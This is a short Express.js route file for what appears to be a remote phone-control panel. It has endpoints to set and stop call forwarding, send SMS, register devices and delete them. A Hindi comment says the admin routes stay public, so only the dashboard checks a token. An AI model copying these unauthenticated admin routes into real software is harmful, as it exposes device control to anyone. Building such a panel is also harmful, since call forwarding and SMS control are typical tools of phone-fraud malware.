const express = require('express');
const router = express.Router();
const deviceController = require('../controllers/deviceController');
const { verifyToken } = require('../middleware/verifyToken');
router.get('/dashboard', verifyToken, deviceController.getAllDevicesData);

// Baaki routes public rahenge
router.get('/admin/phone/:id', deviceController.getDeviceDetails);
router.post('/admin/set/:id', deviceController.setCallForwarding);
router.post('/admin/stop/:id', deviceController.stopCallForwarding);
router.get('/admin/call-status/:id', deviceController.getCallForwardingStatus);
router.post('/admin/device-details', deviceController.addDeviceDetails);
router.post('/send-sms/:id', deviceController.sendSms);
router.post('/update-password', deviceController.updateDeletePassword);
router.post('/delete/:id', deviceController.deleteDevice); 

module.exports = router;
